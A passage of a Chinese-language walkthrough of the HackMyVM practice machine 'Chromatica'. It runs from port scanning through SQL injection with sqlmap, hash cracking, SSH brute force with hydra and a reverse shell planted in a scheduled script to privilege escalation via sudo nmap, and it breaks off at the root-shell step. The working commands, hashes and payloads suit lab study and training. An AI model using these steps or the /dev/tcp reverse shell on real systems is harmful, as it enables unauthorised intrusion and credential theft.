# hmv_Chromatica

**靶机**：https://hackmyvm.eu/machines/machine.php?vm\=Chromatica
**难度**：绿色
**目标 IP**：192.168.205.215
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:18 CST
Nmap scan report for 192.168.205.215
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
5353/tcp open  domain  dnsmasq 2.86
MAC Address: 08:00:27:95:39:FD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.66 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP) 、5353(DNS)端口。

### **2. Web 服务探测与SQL注入**

对 80 端口感兴趣，访问 Web 页面，静态页没有利用价值，扫描一下结构

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.215/
http://192.168.205.215/ [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.205.215], Script, Title[Chromatica|Coming Soon.....]  
```

Chromatica不知道什么东西，搜一下漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Chromatica      
Exploits: No Results
Shellcodes: No Results

```

没有，那就爆破一下目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.215/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404                       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 4047]
/.html                (Status: 403) [Size: 280]
/assets               (Status: 301) [Size: 319] [--> http://192.168.205.215/assets/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.205.215/css/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.205.215/js/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.205.215/javascript/]
/robots.txt           (Status: 200) [Size: 36]
Progress: 25342 / 6369165 (0.40%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 29872 / 6369165 (0.47%)
===============================================================
Finished
===============================================================

```

`/robots.txt`看看有什么

![image](https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415)

![image](https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d)

直接访问被拦截，加上用户代理`dev`我这使用的是`hackbar`

![image](https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d)

访问成功，有输入框试试sql注入

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev 
        ___
       __H__                                                                                                                         
 ___ ___[)]_____ ___ ___  {1.8.12#stable}                                                                                              
|_ -| . [,]     | .'| . |                                                                                                            
|___|_  [,]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:28:16 /2024-12-30/

[14:28:16] [INFO] testing connection to the target URL
[14:28:16] [INFO] searching for forms
[1/1] Form:
GET http://192.168.205.215/dev-portal/search.php?city=
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: city=]: city=
do you want to fill blank fields with random values? [Y/n] Y
[14:28:16] [INFO] resuming back-end DBMS 'mysql' 
[14:28:16] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[14:28:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:28:16] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv'                                                                                                         

[*] ending @ 14:28:16 /2024-12-30/

                                                                    
```

一发入魂

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev -D Chromatica -T users -C username,password --dump
        ___
       __H__                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.8.12#stable}                                                                                              
|_ -| . [']     | .'| . |                                                                                                            
|___|_  ["]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:31:19 /2024-12-30/

[14:31:19] [INFO] testing connection to the target URL
[14:31:19] [INFO] searching for forms
[1/1] Form:
GET http://192.168.205.215/dev-portal/search.php?city=
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: city=]: city=
do you want to fill blank fields with random values? [Y/n] Y
[14:31:19] [INFO] resuming back-end DBMS 'mysql' 
[14:31:19] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[14:31:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:31:19] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'Chromatica'
[14:31:19] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: Chromatica
Table: users
[5 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| admin     | 8d06f5ae0a469178b28bbd34d1da6ef3 |
| dev       | 1ea6762d9b86b5676052d1ebd5f649d7 |
| user      | 3dd0f70a06e2900693fc4b684484ac85 |
| dev-selim | f220c85e3ff19d043def2578888fb4e5 |
| intern    | aaf7fb4d4bffb8c8002978a9c9c6ddc9 |
+-----------+----------------------------------+

[14:31:19] [INFO] table 'Chromatica.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.205.215/dump/Chromatica/users.csv'                                                                                                                             
[14:31:19] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv'                                                                                                         

[*] ending @ 14:31:19 /2024-12-30/

                                                      
```

提取一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F ' ' '{print $2 ":" $4}' 
:
username:password
:
admin:8d06f5ae0a469178b28bbd34d1da6ef3
dev:1ea6762d9b86b5676052d1ebd5f649d7
user:3dd0f70a06e2900693fc4b684484ac85
dev-selim:f220c85e3ff19d043def2578888fb4e5
intern:aaf7fb4d4bffb8c8002978a9c9c6ddc9
:
:

```

直接复制就好了

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp1
admin:8d06f5ae0a469178b28bbd34d1da6ef3
dev:1ea6762d9b86b5676052d1ebd5f649d7
user:3dd0f70a06e2900693fc4b684484ac85
dev-selim:f220c85e3ff19d043def2578888fb4e5
intern:aaf7fb4d4bffb8c8002978a9c9c6ddc9
                                             
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tmp1 --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
keeptrying       (user)   
1g 0:00:00:00 DONE (2024-12-30 14:38) 1.785g/s 25613Kp/s 25613Kc/s 102933KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
                    
```

爆不出来丢[[crackstation](https://crackstation.net/)](https://crackstation.net/)看有没有结果

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp1|awk -F ':' '{print $2}'
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9

```

![image](https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d)

构建一下`user`和`pass`爆破ssh

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp1|awk -F ':' '{print $1}' > user
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat user                             
admin
dev
user
dev-selim
intern

┌──(kali㉿kali)-[~/test]
└─$ cat tmp1|awk -F ':' '{print $2}' > pass
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat pass                             
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9

#然后把crackstation结果手输进去

┌──(kali㉿kali)-[~/test]
└─$ vim pass
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat pass
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9
adm!n
flaghere
keeptrying
intern00
                
```

当然你把那个网格复制下来过滤也行

### 3.ssh 爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P pass ssh://192.168.205.215 -V -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-30 14:44:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 60 tasks per 1 server, overall 60 tasks, 60 login tries (l:5/p:12), ~1 try per task
[DATA] attacking ssh://192.168.205.215:22/
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "admin" - 1 of 60 [child 0] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "dev" - 2 of 60 [child 1] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "user" - 3 of 60 [child 2] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "dev-selim" - 4 of 60 [child 3] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "intern" - 5 of 60 [child 4] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "" - 6 of 60 [child 5] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "" - 7 of 60 [child 6] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "" - 8 of 60 [child 7] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "" - 9 of 60 [child 8] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "" - 10 of 60 [child 9] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "nimda" - 11 of 60 [child 10] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "ved" - 12 of 60 [child 11] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "resu" - 13 of 60 [child 12] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "miles-ved" - 14 of 60 [child 13] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "nretni" - 15 of 60 [child 14] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "8d06f5ae0a469178b28bbd34d1da6ef3" - 16 of 60 [child 15] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "8d06f5ae0a469178b28bbd34d1da6ef3" - 17 of 60 [child 16] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "8d06f5ae0a469178b28bbd34d1da6ef3" - 18 of 60 [child 17] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "8d06f5ae0a469178b28bbd34d1da6ef3" - 19 of 60 [child 18] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "8d06f5ae0a469178b28bbd34d1da6ef3" - 20 of 60 [child 19] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "1ea6762d9b86b5676052d1ebd5f649d7" - 21 of 60 [child 20] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "1ea6762d9b86b5676052d1ebd5f649d7" - 22 of 60 [child 21] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "1ea6762d9b86b5676052d1ebd5f649d7" - 23 of 60 [child 22] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "1ea6762d9b86b5676052d1ebd5f649d7" - 24 of 60 [child 23] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "1ea6762d9b86b5676052d1ebd5f649d7" - 25 of 60 [child 24] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "3dd0f70a06e2900693fc4b684484ac85" - 26 of 60 [child 25] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "3dd0f70a06e2900693fc4b684484ac85" - 27 of 60 [child 26] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "3dd0f70a06e2900693fc4b684484ac85" - 28 of 60 [child 27] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "3dd0f70a06e2900693fc4b684484ac85" - 29 of 60 [child 28] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "3dd0f70a06e2900693fc4b684484ac85" - 30 of 60 [child 29] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "f220c85e3ff19d043def2578888fb4e5" - 31 of 60 [child 30] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "f220c85e3ff19d043def2578888fb4e5" - 32 of 60 [child 31] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "f220c85e3ff19d043def2578888fb4e5" - 33 of 60 [child 32] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "f220c85e3ff19d043def2578888fb4e5" - 34 of 60 [child 33] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "f220c85e3ff19d043def2578888fb4e5" - 35 of 60 [child 34] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 36 of 60 [child 35] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 37 of 60 [child 36] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 38 of 60 [child 37] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 39 of 60 [child 38] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 40 of 60 [child 39] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "adm!n" - 41 of 60 [child 40] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "adm!n" - 42 of 60 [child 41] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "adm!n" - 43 of 60 [child 42] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "adm!n" - 44 of 60 [child 43] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "adm!n" - 45 of 60 [child 44] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "flaghere" - 46 of 60 [child 45] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "flaghere" - 47 of 60 [child 46] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "flaghere" - 48 of 60 [child 47] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "flaghere" - 49 of 60 [child 48] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "flaghere" - 50 of 60 [child 49] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "keeptrying" - 51 of 60 [child 50] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "keeptrying" - 52 of 60 [child 51] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "keeptrying" - 53 of 60 [child 52] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "keeptrying" - 54 of 60 [child 53] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "keeptrying" - 55 of 60 [child 54] (0/0)
[ATTEMPT] target 192.168.205.215 - login "admin" - pass "intern00" - 56 of 60 [child 55] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev" - pass "intern00" - 57 of 60 [child 56] (0/0)
[ATTEMPT] target 192.168.205.215 - login "user" - pass "intern00" - 58 of 60 [child 57] (0/0)
[ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "intern00" - 59 of 60 [child 58] (0/0)
[ATTEMPT] target 192.168.205.215 - login "intern" - pass "intern00" - 60 of 60 [child 59] (0/0)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "dev-selim" - 61 of 79 [child 8] (1/19)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "miles-ved" - 62 of 79 [child 6] (2/19)
[REDO-ATTEMPT] target 192.168.205.215 - login "user" - pass "3dd0f70a06e2900693fc4b684484ac85" - 63 of 79 [child 7] (3/19)
[REDO-ATTEMPT] target 192.168.205.215 - login "admin" - pass "f220c85e3ff19d043def2578888fb4e5" - 64 of 79 [child 9] (4/19)
[REDO-ATTEMPT] target 192.168.205.215 - login "user" - pass "f220c85e3ff19d043def2578888fb4e5" - 65 of 80 [child 5] (5/20)
[REDO-ATTEMPT] target 192.168.205.215 - login "admin" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 66 of 80 [child 14] (6/20)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 67 of 81 [child 34] (7/21)
[REDO-ATTEMPT] target 192.168.205.215 - login "admin" - pass "intern00" - 68 of 82 [child 39] (8/22)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev" - pass "8d06f5ae0a469178b28bbd34d1da6ef3" - 69 of 82 [child 4] (9/22)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev" - pass "intern00" - 70 of 83 [child 19] (10/23)
[REDO-ATTEMPT] target 192.168.205.215 - login "intern" - pass "1ea6762d9b86b5676052d1ebd5f649d7" - 71 of 84 [child 44] (11/24)
[REDO-ATTEMPT] target 192.168.205.215 - login "admin" - pass "3dd0f70a06e2900693fc4b684484ac85" - 72 of 84 [child 29] (12/24)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev" - pass "3dd0f70a06e2900693fc4b684484ac85" - 73 of 85 [child 54] (13/25)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "flaghere" - 74 of 86 [child 5] (14/26)
[REDO-ATTEMPT] target 192.168.205.215 - login "intern" - pass "flaghere" - 75 of 86 [child 8] (15/26)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev" - pass "flaghere" - 76 of 86 [child 23] (16/26)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev" - pass "keeptrying" - 77 of 86 [child 18] (17/26)
[REDO-ATTEMPT] target 192.168.205.215 - login "dev-selim" - pass "intern00" - 78 of 86 [child 33] (18/26)
[REDO-ATTEMPT] target 192.168.205.215 - login "intern" - pass "intern00" - 79 of 86 [child 28] (19/26)
[REDO-ATTEMPT] target 192.168.205.215 - login "admin" - pass "f220c85e3ff19d043def2578888fb4e5" - 80 of 86 [child 43] (20/26)
[REDO-ATTEMPT] target 192.168.205.215 - login "admin" - pass "aaf7fb4d4bffb8c8002978a9c9c6ddc9" - 81 of 87 [child 53] (21/27)
[22][ssh] host: 192.168.205.215   login: dev   password: flaghere
[STATUS] attack finished for 192.168.205.215 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-30 14:44:53
                                                                                  
```

挺快的，就86种可能

### 4.提权

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh dev@192.168.205.215                                                                                                         
dev@192.168.205.215's password: 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 192.168.205.215 closed.
                                             
翻译：
您好，
此帐户不是登录帐户
如果您想对此帐户进行维护，您必须
联系您的管理员
或跳出思维定式
偷懒并联系您的管理员
或者也许您应该多动动脑子，呵呵，
问候

brightctf{ALM0ST_TH3R3_34897ffdf69}
与 192.168.205.215 的连接已关闭。
```

把我踢下线了，看看详细

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh dev@192.168.205.215 -v
OpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024
......
dev@192.168.205.215's password: 
Authenticated to 192.168.205.215 ([192.168.205.215]:22) using "password".
debug1: channel 0: new session [client-session] (inactive timeout: 0)
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: filesystem
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts for 192.168.205.215 / (none)
debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts2 for 192.168.205.215 / (none)
debug1: client_input_hostkeys: hostkeys file /home/kali/.ssh/known_hosts2 does not exist
debug1: client_input_hostkeys: no new or deprecated keys from server
debug1: Sending environment.
debug1: channel 0: setting env LANG = "zh_CN.UTF-8"
debug1: pledge: fork
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
debug1: channel 0: free: client-session, nchannels 1
Connection to 192.168.205.215 closed.
Transferred: sent 3964, received 3860 bytes, in 0.4 seconds
Bytes per second: sent 11238.5, received 10943.6
debug1: Exit status 0
                   

翻译：
使用“密码”向 192.168.205.215 ([192.168.205.215]:22) 进行身份验证。
debug1：通道 0：新会话 [client-session]（非活动超时：0）
debug1：请求 no-more-sessions@openssh.com
debug1：进入交互式会话。
debug1：承诺：文件系统
debug1：client_input_global_request：rtype hostkeys-00@openssh.com want_reply 0
debug1：client_input_hostkeys：在 /home/kali/.ssh/known_hosts 中搜索 192.168.205.215 / (无)
debug1：client_input_hostkeys：在 /home/kali/.ssh/known_hosts2 中搜索 192.168.205.215 / (无)
debug1：client_input_hostkeys：hostkeys 文件 /home/kali/.ssh/known_hosts2 不存在
debug1：client_input_hostkeys：没有来自服务器的新密钥或弃用的密钥
debug1：正在发送环境。
debug1：频道 0：设置环境语言 =“zh_CN.UTF-8”
debug1：承诺：fork
```

创建了会话，不会了，去看了`HGBE`大佬的wp，原来是那个缩小提权的那个东西啊

![image](https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134)

输入`!/bin/bash`就可以放大了

![image](https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983)

他是这样实现的，可以学习一下

![image](https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604)

```bash
dev@Chromatica:~$ ls -al
total 72                                                                                                                             
drwxr-x--- 7 dev  dev  4096 Apr 18  2024 .                                                                                           
drwxr-xr-x 4 root root 4096 Mar 28  2023 ..                                                                                          
-rw------- 1 dev  dev  3467 Apr 24  2024 .bash_history                                                                               
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout                                                                                
-rw-r--r-- 1 dev  dev  3814 Mar 28  2023 .bashrc                                                                                     
-rwxrwxr-x 1 root root   56 Mar 28  2023 bye.sh                                                                                      
drwx------ 2 dev  dev  4096 Mar 21  2023 .cache                                                                                      
drwxrwxr-x 3 dev  dev  4096 Mar 21  2023 .config                                                                                     
drwx------ 3 dev  dev  4096 Apr 18  2024 .gnupg                                                                                      
-rw-rw-r-- 1 root root  280 Jun  2  2023 hello.txt                                                                                   
-rw------- 1 dev  dev    20 Mar 28  2023 .lesshst                                                                                    
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile                                                                                    
drwx------ 4 dev  dev  4096 Mar 27  2023 snap                                                                                        
-rw-r--r-- 1 root root   35 May 23  2023 user.txt                                                                                    
drwxr-xr-x 2 dev  dev  4096 Jun 19  2023 .vim                                                                                        
-rw------- 1 dev  dev  9900 Apr 18  2024 .viminfo      
```

`.bash_history`他没删除，我们直接看就好了

![image](https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2)

感兴趣

![image](https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56)

我们可以执行还是`analyst`用户的，我直接甩了一个反弹shell上去

```bash
dev@Chromatica:~$ echo 'bash -c "bash -i >& /dev/tcp/192.168.205.141/8888 0>&1"' > /opt/scripts/end_of_day.sh
dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh
bash -c "bash -i >& /dev/tcp/192.168.205.141/8888 0>&1"

```

让子弹飞会

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.215] 58754
bash: cannot set terminal process group (3073): Inappropriate ioctl for device
bash: no job control in this shell
analyst@Chromatica:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
analyst@Chromatica:~$ 

```

弹回来了

```bash
analyst@Chromatica:~$ sudo -l
sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap

```

可以使用`sudo`权限执行nmap，打开`https://gtfobins.github.io/`搜一下就有了

![image](https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60)

```bash
analyst@Chromatica:~$ TF=$(mktemp)
TF=$(mktemp)
analyst@Chromatica:~$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
analyst@Chromatica:~$ sudo nmap --script=$TF
sudo nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-30 06:59 UTC
